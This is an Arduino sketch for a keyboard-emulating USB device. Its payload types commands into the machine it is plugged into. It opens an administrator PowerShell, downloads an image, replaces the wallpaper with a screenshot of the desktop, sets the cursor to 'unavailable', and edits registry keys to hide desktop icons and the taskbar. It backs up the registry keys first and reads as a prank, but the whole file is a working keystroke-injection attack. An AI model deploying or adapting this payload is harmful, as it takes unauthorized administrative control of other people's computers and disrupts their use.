#include <Keyboard.h>

// Press & release function
void typeKey(int key){
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
  delay(150);
}

// Windows + key combination
void winKey(int key){
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(key);
  Keyboard.releaseAll();
  delay(250);
}

  // Start powershell as administrator
void powershellAdmin(){
  winKey(114);
  Keyboard.print("powershell.exe");
  delay(250);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(1000);
  typeKey(KEY_LEFT_ARROW);
  typeKey(KEY_RETURN);
  delay(500);  
}

  // Hit return key with delays to let slower PC process
void enter(){
  delay(250);
  typeKey(KEY_RETURN);
  delay(350);
}

void repeatKeys(int number,int keyRepeat){
  for (int i = 0 ; i < number ; i++){
    typeKey(keyRepeat);
  }
}

void setup()
{

  // If the button is pressed, payload doesn't start
  pinMode(3, INPUT_PULLUP);
  if (digitalRead(3) == LOW){
    while(1);
  }
  
  Keyboard.begin();

  // Start Payload
  delay(3000);

  // Show desktop (minimize all windows)
  winKey(100);

  // Use this for keyboards with different layouts
  // winKey(114);
  // This is for an AZERTY layout keyboard :
  // Keyboard.print("pozershell<exe Set6ZinUserLqnguqgeList 6LqnguqgeList en6US");
  // enter();
  // enter();

  powershellAdmin();
  Keyboard.print("New-Item -Path C:\\ -Name pond -ItemType Directory"); //Creating a directory to store resources and backups
  enter();
  Keyboard.print("Invoke-WebRequest https://i.imgur.com/bHp57l8.jpg -OutFile C:\\pond\\wallpaper.jpg");
  enter();
  delay(2000); // Additional delay if target has slow download speed

  Keyboard.print("cd C:\\pond ; mspaint wallpaper.jpg ; exit");
  enter();
  delay(2000); // Delay to open mspaint

  // Copy the image, in case Windows version isn't recent enough for the screenshot part to work
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(97);
  Keyboard.releaseAll();
  delay(100);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(99);
  Keyboard.releaseAll();
  delay(100);

  // Set image as background
  typeKey(KEY_LEFT_ALT);
  typeKey(102);
  typeKey(98);
  delay(100);

  // Windows + D to show desktop
  winKey(100);

  // Take a screenshot
  Keyboard.press(KEY_LEFT_SHIFT);
  winKey(115);
  delay(750);
  repeatKeys(4,KEY_TAB);
  typeKey(KEY_RETURN);
  delay(750);

  // Open paint, paste the screenshot and set it as wallpaper
  winKey(114);
  Keyboard.print("mspaint");
  delay(250);
  typeKey(KEY_RETURN);
  delay(2000);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(118);
  Keyboard.releaseAll();
  delay(250);
  typeKey(KEY_LEFT_ALT);
  typeKey(102);
  typeKey(98);
  typeKey(KEY_RETURN);
  delay(100);
  typeKey(KEY_RETURN);
  delay(250);

  // Closing paint
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.releaseAll();
  delay(100);

  // Open mouse config
  winKey(114);
  Keyboard.print("control main.cpl");
  delay(100);
  typeKey(KEY_RETURN);
  delay(500);

  // Set cursor to "Unavailable"
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_TAB);
  Keyboard.releaseAll();
  typeKey(KEY_RIGHT_ARROW);
  repeatKeys(6,KEY_TAB);
  typeKey(KEY_RETURN);
  repeatKeys(4,KEY_TAB);
  Keyboard.print("aero_unavail");
  typeKey(KEY_RETURN);
  typeKey(KEY_TAB);
  typeKey(KEY_RETURN);
  
  // Removing icons and setting taskbar to auto hide on top
  powershellAdmin(); 
  Keyboard.print("reg export HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer C:\\pond\\explorerPolicies.reg");  
  enter();
  Keyboard.print("New-Item -Path HKCU:/Software/Microsoft/Windows/CurrentVersion/Policies -Name Explorer -Force");
  enter();
  Keyboard.print("New-ItemProperty -Path HKCU:/Software/Microsoft/Windows/CurrentVersion/Policies/Explorer -Name NoDesktop -PropertyType Dword -Value 1 -Force");
  enter();
  Keyboard.print("reg export HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StuckRects3\\ C:\\pond\\stuckrects3.reg");
  enter();
  Keyboard.print("Set-ItemProperty -Path HKCU:/Software/Microsoft/Windows/CurrentVersion/Explorer/StuckRects3 -Name Settings -Value ([byte[]](0x30,0x00,0x00,0x00,0xFE,0xFF,0xFF,0xFF,0x03,0x10,0x00,0x00,0x01,0x00,0x00,0x00,0x51,0x00,0x00,0x00,0x32,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x51,0x00,0x00,0x00,0x38,0x04,0x00,0x00,0x78,0x00,0x00,0x00,0x01,0x00,0x00,0x00))");
  enter();
  Keyboard.print("Stop-Process -Name explorer -Force ; exit");
  enter();
  
  // End Payload

  Keyboard.end();
}


void loop() {}
